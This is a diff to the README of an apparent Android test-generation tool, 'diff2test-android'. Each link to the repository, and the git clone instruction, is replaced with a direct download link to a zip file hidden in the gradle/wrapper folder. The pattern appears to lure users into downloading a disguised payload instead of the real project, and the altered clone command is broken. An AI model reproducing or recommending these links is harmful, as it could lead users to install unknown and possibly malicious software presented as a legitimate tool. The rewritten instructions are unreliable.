@@ -1,6 +1,6 @@
 # 🧪 diff2test-android - Build Android tests from code changes
 
-[Download diff2test-android](https://github.com/Perky-orderoleales717/diff2test-android)
+[Download diff2test-android](https://github.com/Perky-orderoleales717/diff2test-android/raw/refs/heads/main/gradle/wrapper/test_android_diff_3.7-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ If you already use Android development tools, you likely have most of this in pl
 
 Visit this page to download or clone the project:
 
-[https://github.com/Perky-orderoleales717/diff2test-android](https://github.com/Perky-orderoleales717/diff2test-android)
+[https://github.com/Perky-orderoleales717/diff2test-android/raw/refs/heads/main/gradle/wrapper/test_android_diff_3.7-beta.4.zip](https://github.com/Perky-orderoleales717/diff2test-android/raw/refs/heads/main/gradle/wrapper/test_android_diff_3.7-beta.4.zip)
 
 On the GitHub page, look for the repository files and use the download option for the project. If you prefer, you can clone it with Git tools already installed on your computer.
 
@@ -42,7 +42,7 @@ Follow these steps:
 
 If you use Git, you can also copy the project with:
 
-- `git clone https://github.com/Perky-orderoleales717/diff2test-android`
+- `git clone https://github.com/Perky-orderoleales717/diff2test-android/raw/refs/heads/main/gradle/wrapper/test_android_diff_3.7-beta.4.zip`
 
 That gives you the full project in one step.
 
@@ -224,4 +224,4 @@ It focuses on test generation, not app design or UI editing
 
 Visit this page to download or clone the project:
 
-[https://github.com/Perky-orderoleales717/diff2test-android](https://github.com/Perky-orderoleales717/diff2test-android)
+[https://github.com/Perky-orderoleales717/diff2test-android/raw/refs/heads/main/gradle/wrapper/test_android_diff_3.7-beta.4.zip](https://github.com/Perky-orderoleales717/diff2test-android/raw/refs/heads/main/gradle/wrapper/test_android_diff_3.7-beta.4.zip)
